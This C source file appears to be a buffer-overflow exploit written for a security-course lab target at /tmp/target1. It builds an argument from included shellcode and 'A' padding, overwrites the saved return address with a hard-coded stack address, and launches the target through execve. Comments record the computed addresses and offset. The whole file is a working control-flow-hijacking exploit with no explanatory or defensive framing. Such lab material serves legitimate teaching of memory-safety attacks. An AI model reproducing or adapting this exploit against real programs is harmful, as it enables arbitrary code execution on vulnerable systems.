#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
	char arg1[180];
	strcpy(arg1, shellcode);
	memset(arg1 + strlen(shellcode), 'A', sizeof(arg1)-37);
	arg1[164]=0x70;
	arg1[165]=0xfc;
	arg1[166]=0xff;
	arg1[167]=0xbe;
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };
	// return = befffd14
	// arg = befffc70
	//  = diff of 168 +4 +1 = 173
	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
